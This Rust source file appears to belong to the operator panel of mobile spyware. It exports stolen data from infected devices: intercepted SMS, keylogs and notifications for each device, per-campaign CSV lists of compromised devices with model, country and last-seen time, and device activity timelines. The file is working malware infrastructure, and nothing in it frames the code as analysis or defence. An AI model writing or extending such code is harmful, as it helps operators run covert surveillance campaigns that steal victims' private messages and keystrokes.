// [context: Rust, Linux/x64, bulk data export for operator panel]

use sqlx::PgPool;
use thiserror::Error;
use uuid::Uuid;
use serde::Serialize;
use crate::data::search::{DataSearch, TimelineEvent, DateRange};

#[derive(Error, Debug)]
pub enum ExportError {
    #[error("database error: {0}")]
    Db(#[from] sqlx::Error),
    #[error("search error: {0}")]
    Search(#[from] crate::data::search::SearchError),
    #[error("serialize error")]
    Serialize,
}

pub struct DataExporter {
    pool: PgPool,
    search: DataSearch,
}

impl DataExporter {
    pub fn new(pool: PgPool) -> Self {
        let search = DataSearch::new(pool.clone());
        Self { pool, search }
    }

    pub async fn export_device_json(&self, device_id: &str) -> Result<String, ExportError> {
        let sms = self.search.search_sms(device_id, None, None).await?;
        let keylogs = self.search.search_keylogs(device_id, None).await?;
        let notifs = self.search.search_notifications(device_id, None).await?;
        let export = serde_json::json!({
            "device_id": device_id,
            "exported_at": chrono::Utc::now().to_rfc3339(),
            "sms": sms,
            "keylogs": keylogs,
            "notifications": notifs,
        });
        serde_json::to_string_pretty(&export).map_err(|_| ExportError::Serialize)
    }

    pub async fn export_campaign_csv(&self, campaign_id: &str) -> Result<String, ExportError> {
        let rows = sqlx::query!(
            r#"SELECT d.id::text, d.model, d.country_code, d.last_seen
               FROM devices d WHERE d.campaign_id = $1"#,
            Uuid::parse_str(campaign_id).unwrap_or_default()
        )
        .fetch_all(&self.pool)
        .await?;

        let mut csv = String::from("device_id,model,country,last_seen\n");
        for row in rows {
            csv.push_str(&format!(
                "{},{},{},{}\n",
                row.id,
                row.model.unwrap_or_default(),
                row.country_code.unwrap_or_default(),
                row.last_seen.map(|t| t.to_string()).unwrap_or_default()
            ));
        }
        Ok(csv)
    }

    pub async fn export_timeline(
        &self,
        device_id: &str,
        start: i64,
        end: i64,
    ) -> Result<Vec<TimelineEvent>, ExportError> {
        self.search.get_device_timeline(device_id, start, end).await.map_err(Into::into)
    }
}
